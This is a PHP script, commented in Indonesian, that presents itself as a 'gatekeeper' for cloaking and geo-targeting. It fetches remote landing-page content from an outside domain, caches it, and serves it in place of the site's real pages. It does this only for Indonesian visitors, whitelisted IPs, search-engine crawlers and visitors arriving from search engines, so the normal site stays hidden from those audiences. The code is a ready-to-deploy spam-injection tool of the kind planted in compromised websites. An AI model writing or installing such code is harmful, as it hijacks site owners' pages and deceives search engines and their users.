<?php
/**
 * ===================================================================
 * STANDALONE GATEKEEPER SCRIPT (CLOAKING + GEO-TARGETING)
 * ===================================================================
 */

class StandaloneGatekeeper {

    private $config;
    private $visitorData;

    public function __construct() {
        $this->config = [
            'run_on_all_pages' => true,
            'check_referrer'   => true,
            'target_url'       => 'https://www.dosabedagenre.pro/teisushi/a.txt', // <-- GANTI LINK ANDA
            'ip_whitelist'     => ['85.92.66.150', '81.19.188.236'],
            'bot_keywords'     => ['bot', 'crawl', 'spider', 'ahrefs', 'semrush', 'google'],
            'cache_dir'        => __DIR__ . '/cache',
            'cache_key'        => 'standalone_gatekeeper_content',
            'cache_duration'   => 7200, // 2 jam
        ];
    }
    
    // Fungsi baru untuk geo-target
    private function getCountryCode($ip) {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
        if ($response) {
            $data = json_decode($response, true);
            if (isset($data['status']) && $data['status'] === 'success') {
                return $data['countryCode'];
            }
        }
        return '';
    }

    private function gatherVisitorData() {
        $this->visitorData = [
            'ip'          => isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"],
            'user_agent'  => isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '',
            'referrer'    => isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '',
            'request_uri' => $_SERVER['REQUEST_URI'],
            'country_code'=> $this->getCountryCode(isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"])
        ];
    }

    private function shouldShowLp() {
        if (!$this->config['run_on_all_pages'] && $this->visitorData['request_uri'] !== '/') {
            return false;
        }

        // Cek Negara
        if ($this->visitorData['country_code'] === 'ID') return true;

        // Cek IP Whitelist
        if (in_array($this->visitorData['ip'], $this->config['ip_whitelist'])) return true;

        // Cek User Agent
        foreach ($this->config['bot_keywords'] as $keyword) {
            if (strpos($this->visitorData['user_agent'], $keyword) !== false) return true;
        }

        // Cek Referrer
        if ($this->config['check_referrer']) {
            if (preg_match('/(google|bing|yahoo|yandex)\./i', $this->visitorData['referrer'])) return true;
        }

        return false;
    }
    
    private function getLpContent() {
        $cache_file = $this->config['cache_dir'] . '/' . md5($this->config['cache_key']) . '.cache';

        if (file_exists($cache_file) && (time() - filemtime($cache_file)) < $this->config['cache_duration']) {
            return file_get_contents($cache_file);
        }

        $content = @file_get_contents($this->config['target_url']);
        if ($content !== false) {
            if (!is_dir($this->config['cache_dir'])) {
                mkdir($this->config['cache_dir'], 0755, true);
            }
            file_put_contents($cache_file, $content);
            return $content;
        }
        
        return false;
    }

    public function run() {
        $this->gatherVisitorData();
        
        if ($this->shouldShowLp()) {
            $lp_content = $this->getLpContent();
            if ($lp_content !== false) {
                echo $lp_content;
                die();
            }
        }
    }
}

// Inisialisasi dan Jalankan Gatekeeper
$gatekeeper = new StandaloneGatekeeper();
$gatekeeper->run();